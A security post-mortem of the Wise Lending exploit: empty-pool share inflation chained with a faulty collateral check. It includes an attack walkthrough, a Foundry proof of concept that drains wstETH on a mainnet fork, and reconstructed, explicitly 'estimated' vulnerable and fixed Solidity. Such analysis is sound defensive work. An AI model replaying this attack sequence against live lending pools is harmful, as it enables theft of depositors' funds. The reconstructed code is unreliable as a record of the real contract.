# Wise Lending — Share Price Inflation & Faulty Health Factor Check Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-12 |
| **Protocol** | Wise Lending |
| **Chain** | Ethereum (Mainnet) |
| **Loss** | ~$464,000 (177 ETH) |
| **Attacker** | [0xb90c...d8](https://etherscan.io/address/0xb90cf1d740b206b6d8) |
| **Attack Contract** | [0x91c4...82c](https://etherscan.io/address/0x91c49cc7fbfe8f70aceeb075952cd64817f9d82c) |
| **Attack Tx** | [0x04e1...c31](https://etherscan.io/tx/0x04e16a79ff928db2fa88619cdd045cdfc7979a61d836c9c9e585b3d6f6d8bc31) |
| **Vulnerable Contract** | [0x37e4...E4](https://etherscan.io/address/0x37e49bf3749513A02FA535F0CbC383796E8107E4) |
| **Attack Block** | #18,983,652 |
| **Root Cause** | Empty pool first depositor inflation + Faulty health factor calculation (Business Logic Flaw) |
| **PoC Source** | [DeFiHackLabs - WiseLending02_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/WiseLending02_exp.sol) |

---

## 1. Vulnerability Overview

Wise Lending is a Web3 lending protocol that accepts Pendle LP tokens (PLP-stETH) as collateral. This attack exploited a combination of two vulnerabilities.

**Vulnerability 1 — First Depositor Share Inflation**

A well-known pattern in most ERC-4626-style vaults and lending pools. When a pool is completely empty, the first depositor can repeatedly deposit and withdraw `pseudoTotalPool * 2 - 1` amounts, causing `totalDepositShares` to increment by only 1 per cycle while `pseudoTotalPool` doubles each time. After 20 iterations, the real value per share becomes inflated by hundreds of thousands of times or more.

**Vulnerability 2 — Faulty Health Factor Check**

With the share price inflated, the protocol's `maximumBorrowToken()` function accepts the inflated share value as collateral value as-is, allowing borrowing of far more assets than the actual collateral. The borrowed assets (wstETH, etc.) are immediately stolen without repayment.

By combining both vulnerabilities, the attacker drained over 177 ETH worth of wstETH using less than 1 ETH of initial PLP-stETH.

---

## 2. Vulnerable Code Analysis

### 2.1 Share Calculation Logic — First Depositor Inflation (Core Vulnerability)

**Vulnerable Code (estimated) ❌**

```solidity
// WiseLending.sol — share calculation inside depositExactAmount
function _calculateDepositShares(
    address _poolToken,
    uint256 _amount
) internal view returns (uint256 shares) {
    (uint256 pseudoTotalPool, uint256 totalDepositShares,) =
        lendingPoolData[_poolToken];

    // ❌ Vulnerable point: no special handling when totalDepositShares == 0 (empty pool)
    // shares = 0 can be returned when pseudoTotalPool is non-zero
    // Attacker deposits pseudoTotalPool * 2 - 1 to receive only shares = 1
    // and the remaining pseudoTotalPool - 1 tokens are donated to the pool
    if (totalDepositShares == 0) {
        return _amount; // ❌ No protection logic on first deposit
    }
    // shares = amount * totalDepositShares / pseudoTotalPool
    // Integer division → floor → attacker can deliberately manipulate to get shares = 1
    shares = _amount * totalDepositShares / pseudoTotalPool;
}
```

**Fixed Code ✅**

```solidity
// Fix 1: UniswapV2 approach — burn a portion of the initial liquidity
function _calculateDepositShares(
    address _poolToken,
    uint256 _amount
) internal returns (uint256 shares) {
    (uint256 pseudoTotalPool, uint256 totalDepositShares,) =
        lendingPoolData[_poolToken];

    if (totalDepositShares == 0) {
        // ✅ Burn MINIMUM_SHARES to address(0) on first deposit
        // Prevents attacker from inflating the price with shares = 1
        uint256 MINIMUM_SHARES = 1000;
        shares = _amount - MINIMUM_SHARES;
        // Burned shares are permanently locked → cost of price manipulation explodes
        totalDepositShares_[_poolToken] += MINIMUM_SHARES; // address(0) portion
        return shares;
    }
    shares = _amount * totalDepositShares / pseudoTotalPool;
}

// Fix 2: Share price upper bound validation
function _validateSharePrice(address _poolToken) internal view {
    (uint256 pseudoTotalPool, uint256 totalDepositShares,) =
        lendingPoolData[_poolToken];
    if (totalDepositShares == 0) return;

    // ✅ Revert if share unit price is abnormally high
    uint256 sharePrice = pseudoTotalPool * 1e18 / totalDepositShares;
    require(sharePrice <= MAX_SHARE_PRICE, "Share price manipulation detected");
}
```

**Problem**: Depositing `pseudoTotalPool * 2 - 1` yields `shares = (pseudoTotalPool * 2 - 1) * 1 / pseudoTotalPool = 1` (floor via integer division). The `pseudoTotalPool - 1` difference remains in the pool as an effective donation. After 20 repetitions, `pseudoTotalPool` grows by `2^20` or more while `totalDepositShares` remains extremely small.

---

### 2.2 Health Factor Calculation — Inflated Collateral Value Accepted (Secondary Vulnerability)

**Vulnerable Code (estimated) ❌**

```solidity
// WiseSecurity.sol
function maximumBorrowToken(
    uint256 _nftId,
    address _poolToken,
    uint256 _interval
) external view returns (uint256 tokenAmount) {
    // ❌ Vulnerable point: uses the manipulated pseudoTotalPool directly for share valuation
    // Attacker's 1 share represents the entire inflated pseudoTotalPool value
    uint256 collateralValue = _getCollateralValue(_nftId, _poolToken);

    // Apply collateralFactor (LTV)
    tokenAmount = collateralValue
        * lendingPoolData[_poolToken].collateralFactor
        / PRECISION_FACTOR;

    // ❌ No share price anomaly detection → returns inflated collateral value as-is
}

function _getCollateralValue(
    uint256 _nftId,
    address _poolToken
) internal view returns (uint256) {
    uint256 lendShares = getPositionLendingShares(_nftId, _poolToken);

    // ❌ Share value calculated against a manipulated pseudoTotalPool
    (uint256 pseudoTotalPool, uint256 totalDepositShares,) =
        lendingPoolData[_poolToken];

    // shares * pseudoTotalPool / totalDepositShares
    // → 1 share * enormously large pseudoTotalPool / 1 = massive collateral value
    uint256 tokenAmount = lendShares * pseudoTotalPool / totalDepositShares;

    return _getTokenValue(_poolToken, tokenAmount); // apply oracle price
}
```

**Fixed Code ✅**

```solidity
function _getCollateralValue(
    uint256 _nftId,
    address _poolToken
) internal view returns (uint256) {
    uint256 lendShares = getPositionLendingShares(_nftId, _poolToken);
    (uint256 pseudoTotalPool, uint256 totalDepositShares,) =
        lendingPoolData[_poolToken];

    // ✅ Apply upper bound to per-share price
    uint256 sharePrice = pseudoTotalPool * SHARE_PRICE_PRECISION / totalDepositShares;
    require(
        sharePrice <= MAX_REASONABLE_SHARE_PRICE,
        "Abnormal share price: potential manipulation"
    );

    uint256 tokenAmount = lendShares * pseudoTotalPool / totalDepositShares;
    return _getTokenValue(_poolToken, tokenAmount);
}
```

**Problem**: After share price inflation occurs, the health factor calculation blindly trusts the manipulated `pseudoTotalPool` value, allowing borrowing hundreds of times more than the actual collateral value.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Obtain 1 ETH worth of PLP-stETH (Pendle LP token) via deal or prior accumulation
- `Pool(poolToken).depositExactAmount(1 ether)` → receive poolToken 1e18
- `IERC20(poolToken).approve(wiseLending, MAX)` — set unlimited approval
- `nft.mintPosition()` — mint NFT ID for lending position

### 3.2 Execution Phase

```
Step 1: Initial deposit + pool draining
  └─ wiseLending.depositExactAmount(nftId, poolToken, 1e9)
  └─ Direct transfer(1e9) of poolToken to wiseLending address — balance increase without donation
  └─ wiseLending.withdrawExactShares(nftId, poolToken, shares) — full withdrawal

  → Result: pseudoTotalPool ≈ 1 (minimum), totalDepositShares ≈ 0

Step 2: Iterative inflation loop (20 times)
  for (i = 0; i < 20; i++) {
    └─ Query pseudoTotalPool, totalDepositShares
    └─ depositExactAmount(nftId, poolToken, pseudoTotalPool * 2 - 1)
         → shares = (pseudoTotalPool*2-1) * totalDepositShares / pseudoTotalPool = 1
         → donation amount = pseudoTotalPool - 1 (difference locked in pool)
    └─ withdrawExactAmount(nftId, poolToken, shares = 1) — withdraw 1 share
  }

  → After 20 iterations: pseudoTotalPool ≈ 2^20 × initial value (over 1 million× inflation)
                          totalDepositShares ≈ 1 (extremely low)

Step 3: Final inflation deposit (without withdrawal)
  └─ depositExactAmount(nftId, poolToken, pseudoTotalPool * 2 - 1)
  → Attacker holds: 1 share = entire value of manipulated pseudoTotalPool

Step 4: Transfer collateral to another address (other) + over-borrowing
  └─ Transfer full poolToken balance to other address
  └─ mintPosition() for new NFT from other address
  └─ wiseLending.depositExactAmount(nftId, poolToken, balanceOf(other))
  └─ maximumBorrowToken(nftId, poolToken, 0) — query max borrowable amount based on inflated collateral
  └─ wiseLending.borrowExactAmount(nftId, wsteth, amount) — drain large amount of wstETH

Step 5: Profit taking
  └─ Transfer ~177 ETH worth of stolen wstETH to attacker address
```

### 3.3 Attack Flow Diagram

```
┌──────────────────────────────────────────────────────────┐
│                     Attacker                             │
│            0xb90cf1d740b206b6d8...                       │
└────────────────────────┬─────────────────────────────────┘
                         │ 1) Obtain 1 ETH of PLP-stETH
                         ▼
┌──────────────────────────────────────────────────────────┐
│             Pool Contract (poolToken)                    │
│     0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f          │
│  depositExactAmount(1 ETH) → issue poolToken             │
└────────────────────────┬─────────────────────────────────┘
                         │ 2) NFT Mint + initial deposit/withdrawal
                         ▼
┌──────────────────────────────────────────────────────────┐
│              WiseLending Core                            │
│     0x37e49bf3749513A02FA535F0CbC383796E8107E4          │
│  ┌────────────────────────────────────────────────────┐  │
│  │  Iterative inflation loop (20 iterations)          │  │
│  │                                                    │  │
│  │  pseudoTotalPool = P                               │  │
│  │  deposit amount = P * 2 - 1                        │  │
│  │  ──────────────────────────────────────────────   │  │
│  │  shares received = floor((P*2-1) * 1 / P) = 1     │  │
│  │  donation (difference) = P - 1 → locked in pool   │  │
│  │  ──────────────────────────────────────────────   │  │
│  │  next P = P * 2 (doubles each cycle)              │  │
│  │                                                    │  │
│  │  After 20 iterations: P ≈ 2^20 × initial value    │  │
│  └────────────────────────────────────────────────────┘  │
└────────────────────────┬─────────────────────────────────┘
                         │ 3) Final deposit (holding shares)
                         │    inflated pseudoTotalPool
                         ▼
┌──────────────────────────────────────────────────────────┐
│              WiseSecurity                                │
│     0x829c3AE2e82760eCEaD0F384918a650F8a31Ba18          │
│  maximumBorrowToken(nftId, poolToken, 0)                │
│  → returns excessive borrow limit based on manipulated P │
│    (actual collateral << allowed borrow amount)          │
└────────────────────────┬─────────────────────────────────┘
                         │ 4) borrowExactAmount(nftId, wsteth, amount)
                         ▼
┌──────────────────────────────────────────────────────────┐
│              wstETH Token Contract                       │
│     0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0          │
│  Drain 177 ETH worth of wstETH                          │
└────────────────────────┬─────────────────────────────────┘
                         │ 5) Transfer to attacker address
                         ▼
                   [$464,000 loss]
```

### 3.4 Outcome

- **Attacker profit**: ~177 ETH ≈ $464,000
- **Protocol loss**: wstETH pool drained ($460,000–$464,000)
- **Repayment**: None (loan not repaid, bad debt incurred)

---

## 4. PoC Code (DeFiHackLabs)

Core attack logic excerpt (source: `WiseLending02_exp.sol`):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "./../interface.sol";

contract WiseLendingTest is Test {
    IWiseLending public wiseLending =
        IWiseLending(payable(0x37e49bf3749513A02FA535F0CbC383796E8107E4));
    NFTManager public nft = NFTManager(0x32E0A7F7C4b1A19594d25bD9b63EBA912b1a5f61);

    // [Step 1] Attack block — state just before inflation execution
    uint256 blockNumber = 18_983_652;
    address poolToken   = 0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f; // PLP-stETH pool
    address pendleLPT   = 0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2; // underlying asset
    address wsteth      = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0; // target to drain
    address wiseSecurity= 0x829c3AE2e82760eCEaD0F384918a650F8a31Ba18;
    address other;     // separate address for borrowing

    function setUp() public {
        vm.createSelectFork("mainnet", blockNumber); // Mainnet fork
        other = vm.addr(123_123);
    }

    function test_poc() public {
        // [Step 2] Obtain 1 ETH of PLP-stETH and get poolToken
        deal(pendleLPT, address(this), 1 ether);
        IERC20(pendleLPT).approve(poolToken, type(uint256).max);
        Pool(poolToken).depositExactAmount(1 ether); // receive poolToken

        // [Step 3] Initial deposit into wiseLending + direct donation → reset pool state
        IERC20(poolToken).approve(address(wiseLending), type(uint256).max);
        uint256 nftId = nft.mintPosition();
        wiseLending.depositExactAmount(nftId, poolToken, 1e9);
        IERC20(poolToken).transfer(address(wiseLending), 1e9); // direct transfer (donation)

        // [Step 4] Full withdrawal → reset pseudoTotalPool ≈ minimum value
        skip(5 seconds); // advance block timestamp
        uint256 share = wiseLending.getPositionLendingShares(nftId, poolToken);
        wiseLending.withdrawExactShares(nftId, poolToken, share);

        // [Step 5] Core inflation loop — 20 iterations
        uint256 i = 0;
        do {
            (uint256 pseudoTotalPool,,) = wiseLending.lendingPoolData(poolToken);
            // Key: deposit pseudoTotalPool * 2 - 1 → receive shares = 1
            // remaining pseudoTotalPool - 1 is donated to the pool
            // → pseudoTotalPool doubles in the next cycle
            share = wiseLending.depositExactAmount(
                nftId, poolToken, pseudoTotalPool * 2 - 1
            );
            wiseLending.withdrawExactAmount(nftId, poolToken, share); // withdraw 1 share
            ++i;
        } while (i < 20); // 20 iterations → 2^20× inflation

        // [Step 6] Final deposit (no withdrawal) → hold 1 inflated share
        (uint256 pseudoTotalPool,,) = wiseLending.lendingPoolData(poolToken);
        wiseLending.depositExactAmount(nftId, poolToken, pseudoTotalPool * 2 - 1);

        // [Step 7] Transfer manipulated collateral to separate address
        IERC20(poolToken).transfer(other, IERC20(poolToken).balanceOf(address(this)));

        vm.startPrank(other);
        nftId = nft.mintPosition();
        IERC20(poolToken).approve(address(wiseLending), type(uint256).max);
        wiseLending.depositExactAmount(nftId, poolToken, IERC20(poolToken).balanceOf(other));

        // [Step 8] Max borrow based on inflated collateral → drain wstETH
        // WiseSecurity accepts manipulated pseudoTotalPool as collateral value
        uint256 amount = IWiseSecurity(wiseSecurity).maximumBorrowToken(nftId, poolToken, 0);
        wiseLending.borrowExactAmount(nftId, wsteth, amount); // drain ~177 ETH worth
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | First Depositor Share Inflation | CRITICAL | CWE-682 (Incorrect Calculation) | `16_accounting_sync.md`, `17_staking_reward.md` |
| V-02 | Faulty Health Factor / Collateral Value Check | CRITICAL | CWE-840 (Business Logic Error) | `11_logic_error.md`, `18_liquidation.md` |
| V-03 | Precision Loss (Precision Floor) | HIGH | CWE-190 (Integer Overflow/Precision Loss) | `05_integer_issues.md` |

---

### V-01: First Depositor Share Inflation

- **Description**: When a lending pool is empty, the first depositor can repeatedly deposit and withdraw `pseudoTotalPool * 2 - 1` amounts. Each cycle, integer division floor causes exactly 1 share to be issued while the remaining assets are donated to the pool. After 20 iterations, the value of 1 share becomes inflated by millions of times over the actual collateral.
- **Impact**: Uses inflated shares as collateral to borrow all assets from the protocol pool without repayment.
- **Attack Conditions**: (1) Target pool must be empty or drainable. (2) No protective mechanism such as minimum share burn on first deposit. (3) Executable with minimal initial capital (less than 1 ETH).
- **Similar Cases**: Euler Finance (2023, $197M) — donateToReserves abuse / Onyx Protocol (2023) — ERC-4626 inflation / Hundred Finance (2023) — same pattern

---

### V-02: Faulty Health Factor Check

- **Description**: `WiseSecurity.maximumBorrowToken()` calculates collateral value based on the manipulated `pseudoTotalPool`. A single collateral share is valued at millions of times its real worth, allowing borrowing more than the entire protocol liquidity.
- **Impact**: Large-scale borrowing without real collateral, left unrepaid — protocol insolvency.
- **Attack Conditions**: V-01 must be completed first. No share price anomaly detection logic in health factor calculation.

---

### V-03: Precision Loss (Precision Floor)

- **Description**: The `shares = amount * totalDepositShares / pseudoTotalPool` calculation suffers integer division floor, allowing the attacker to precisely control the number of shares received (1). The precise input `pseudoTotalPool * 2 - 1` guarantees this outcome.
- **Impact**: Serves as the core mechanism of V-01, ensuring exactly 1 share is issued per cycle.
- **Attack Conditions**: Integer division used in share calculation + no enforced minimum share issuance.

---

## 6. Remediation Recommendations

### Immediate Actions

**Action 1: Burn minimum shares on first deposit (UniswapV2 approach)**

```solidity
// WiseLending.sol
uint256 constant MINIMUM_LIQUIDITY = 1_000; // minimum to burn

function _calculateDepositShares(
    address _poolToken,
    uint256 _amount
) internal returns (uint256 shares) {
    (uint256 pseudoTotalPool, uint256 totalDepositShares,) =
        lendingPoolData[_poolToken];

    if (totalDepositShares == 0) {
        // ✅ Permanently burn minimum shares → share price manipulation cost explodes
        shares = _amount - MINIMUM_LIQUIDITY;
        _mintSharesToDeadAddress(_poolToken, MINIMUM_LIQUIDITY);
    } else {
        shares = _amount * totalDepositShares / pseudoTotalPool;
    }
}
```

**Action 2: Share price anomaly detection (health factor protection)**

```solidity
// WiseSecurity.sol
uint256 constant MAX_SHARE_PRICE_MULTIPLIER = 1e6; // max allowable multiplier vs baseline

function _validateSharePriceIntegrity(address _poolToken) internal view {
    (uint256 pseudoTotalPool, uint256 totalDepositShares,) =
        lendingPoolData[_poolToken];

    if (totalDepositShares == 0) revert("Empty pool: borrow disallowed");

    // ✅ Block if share price exceeds abnormal multiple of initial value
    uint256 sharePrice = pseudoTotalPool * 1e18 / totalDepositShares;
    require(
        sharePrice <= initialSharePrice[_poolToken] * MAX_SHARE_PRICE_MULTIPLIER,
        "Share price anomaly detected"
    );
}
```

**Action 3: Block borrowing when pool is empty**

```solidity
function borrowExactAmount(
    uint256 _nftId,
    address _poolToken,
    uint256 _amount
) external returns (uint256) {
    (, uint256 totalDepositShares,) = lendingPoolData[_poolToken];
    // ✅ Disallow borrowing if total deposit shares are below threshold
    require(totalDepositShares >= MIN_SHARES_FOR_BORROW, "Insufficient pool liquidity");
    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 First Depositor Inflation | Permanently burn a portion of initial liquidity (1,000 shares) to `address(0xdead)` |
| V-02 Faulty Health Factor | Add independent validation function for share price anomaly before collateral calculation |
| V-03 Precision Loss | Enforce minimum share issuance after calculation (shares < MIN → revert) |
| Common | Reference Euler Finance patch: empty pool detection → automatic pause |
| Common | Document lending pool initialization procedure + protocol seeds initial liquidity directly |

---

## 7. Lessons Learned

1. **An empty pool's first depositor is always an attack vector**: Any contract where `totalSupply == 0` or `totalShares == 0` can occur — whether ERC-4626, lending pools, or AMM LPs — must implement first liquidity protection mechanisms (minimum share burn, protocol-seeded liquidity, etc.).

2. **Health factor calculations must have input integrity checks first**: If the internal state variables used to calculate collateral value (`pseudoTotalPool`, `totalShares`, etc.) can be manipulated, the health factor itself becomes meaningless. An independent anomaly detection layer is required before collateral calculation.

3. **Integer division floor must be defended at the design level**: The floor from `amount * shares / totalPool` can be precisely exploited by an attacker. Minimum share issuance enforcement, decimal scaling, or fee mechanisms must be used as defense.

4. **The same vulnerability recurs**: This incident is fundamentally the same pattern as Euler Finance (2023), Onyx Protocol (2023), Hundred Finance (2023), and Sonne Finance (2024). This checklist is mandatory when auditing new lending protocols.

5. **Attacks are staged combinations**: Even if individual vulnerabilities cause limited damage alone, chaining multiple vulnerabilities together produces catastrophic results. This incident was centered on the chaining of V-01 (inflation) → V-02 (health factor bypass). Auditors must always review vulnerability combination scenarios.

6. **Forked protocols remain vulnerable even after security audits**: Multiple protocols that forked Compound-based code have suffered the same vulnerabilities repeatedly. Forked code can inherit the vulnerabilities of the original, so the audit scope must include a checklist of known vulnerabilities from the original codebase.

---

## 8. On-Chain Verification

### 8.1 Reference Data (Based on Report and PoC)

| Field | Value |
|------|-----|
| Attack Block | #18,983,652 |
| Attack Tx | `0x04e16a79ff928db2fa88619cdd045cdfc7979a61d836c9c9e585b3d6f6d8bc31` |
| Stolen Asset | wstETH |
| Loss Amount (reported) | 177 ETH ≈ $460,000–$464,000 |
| Inflation Loop Count | 20 iterations |
| Deposit Formula | `pseudoTotalPool * 2 - 1` |

### 8.2 On-Chain Event Log Sequence (estimated)

```
[Block #18,983,652]

1. pendleLPT.Transfer(attacker → poolToken)
2. poolToken.Transfer(poolToken → attacker)          ← depositExactAmount
3. poolToken.Transfer(attacker → wiseLending)         ← approve + depositExactAmount
4. poolToken.Transfer(attacker → wiseLending)         ← direct donation transfer
5. poolToken.Transfer(wiseLending → attacker)         ← withdrawExactShares
   × repeated 20 times:
6. poolToken.Transfer(attacker → wiseLending)         ← depositExactAmount(P*2-1)
7. poolToken.Transfer(wiseLending → attacker)         ← withdrawExactAmount
8. poolToken.Transfer(attacker → wiseLending)         ← final depositExactAmount (retained)
9. poolToken.Transfer(attacker → other)               ← address switch
10. poolToken.Transfer(other → wiseLending)           ← re-deposit from other address
11. wstETH.Transfer(wiseLending → other)              ← borrowExactAmount (core drain)
```

### 8.3 Prerequisites

- Before attack execution, the PLP-stETH pool (`poolToken`) balance must be zero for inflation to work effectively
- Oracle (wstETH/ETH) staleness issue: The PoC includes `_simulateOracleCall()` which applies a mock to update oracle data to the current block timestamp — oracle staleness bypass may also have been used during the actual attack
- `NFTManager.mintPosition()` is callable by anyone without permission (no access control)

### 8.4 On-Chain Verification Status

> Direct on-chain queries via `cast` commands were not performed. The above content is based on cross-analysis of PoC code, DeFiHackLabs README, and security research team (AstraSec, PeckShield, SolidityScan) reports.
> For precise verification, use the following commands:
>
> ```bash
> # Query attack Tx
> cast tx 0x04e16a79ff928db2fa88619cdd045cdfc7979a61d836c9c9e585b3d6f6d8bc31 \
>   --rpc-url https://eth-mainnet.public.blastapi.io
>
> # Receipt event logs
> cast receipt --json 0x04e16a79ff928db2fa88619cdd045cdfc7979a61d836c9c9e585b3d6f6d8bc31 \
>   --rpc-url https://eth-mainnet.public.blastapi.io
>
> # Check share price at pre-attack block
> cast call 0x37e49bf3749513A02FA535F0CbC383796E8107E4 \
>   "lendingPoolData(address)(uint256,uint256,uint256)" \
>   0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f \
>   --rpc-url https://eth-mainnet.public.blastapi.io \
>   --block 18983651
> ```

---

## References

- [DeFiHackLabs PoC — WiseLending02_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/WiseLending02_exp.sol)
- [AstraSec — WiseLending Hack Root Cause Analysis](https://medium.com/@astrasec/wiselending-hack-root-cause-analysis-1a2762f52298)
- [SolidityScan — Wise Lending Hack Analysis](https://blog.solidityscan.com/wise-lending-hack-analysis-f652f389e397)
- [CoinTelegraph — Wise Lending drained of $440K](https://cointelegraph.com/news/wise-lending-drained-440k-crypto-apparent-flash-loan-exploit)
- [FXStreet — Wise Lending exploited for 177 ETH](https://www.fxstreet.com/cryptocurrencies/news/wise-lending-market-exploited-for-177-eth-in-a-flash-loan-attack-202401130252)
- [Etherscan — Attack Transaction](https://etherscan.io/tx/0x04e16a79ff928db2fa88619cdd045cdfc7979a61d836c9c9e585b3d6f6d8bc31)
- [Etherscan — Vulnerable Contract](https://etherscan.io/address/0x37e49bf3749513A02FA535F0CbC383796E8107E4)